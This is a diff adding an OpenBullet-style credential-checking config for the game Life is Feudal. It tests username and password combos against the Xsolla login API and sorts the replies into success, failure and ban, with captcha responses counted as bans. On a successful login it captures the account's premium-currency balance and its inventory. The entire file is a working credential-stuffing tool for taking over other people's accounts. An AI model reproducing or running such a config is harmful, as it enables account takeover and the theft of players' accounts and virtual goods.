@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "LifeIsFeudal",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-08T19:07:15.7144828-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!REQUEST GET "https://lifeisfeudal.com/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+REQUEST POST "https://login.xsolla.com/api/proxy/login?projectId=8513c380-0336-4927-b351-02ccec7f3cb6&redirect_url=redirect_url=lif%3A%2F%2F" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember_me\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"login_url\"" 
+  KEYCHAIN Failure OR 
+    KEY "Wrong username or password" 
+  KEYCHAIN Ban OR 
+    KEY "Service is temporarily unavailable" 
+    KEY "Invalid chinese captcha" 
+    KEY "Invalid captcha" 
+
+PARSE "<SOURCE>" LR "login_url\": \"https:\\/\\/lifeisfeudal.com\\/auth\\/?" "\"" -> VAR "Token" "https://lifeisfeudal.com/auth/?" "" 
+
+REQUEST GET "<Token>" ParseQuery=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<HEADER>" LR "&token=" "" -> VAR "uToken" 
+
+REQUEST POST "https://lifeisfeudal.com/billing/xsolla/premium_shop.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "Access" "access_token=" "" 
+
+REQUEST GET "https://secure.xsolla.com/paystation3/?<Access>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"virtual_currency_balance\":{\"amount\":" "}" -> CAP "Gods Favor" 
+
+REQUEST POST "https://secure.xsolla.com/paystation2/api/useraccount/inventory" 
+  CONTENT "<Access>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"name\":\"" "\"" Recursive=TRUE -> CAP "Inventory" 
+
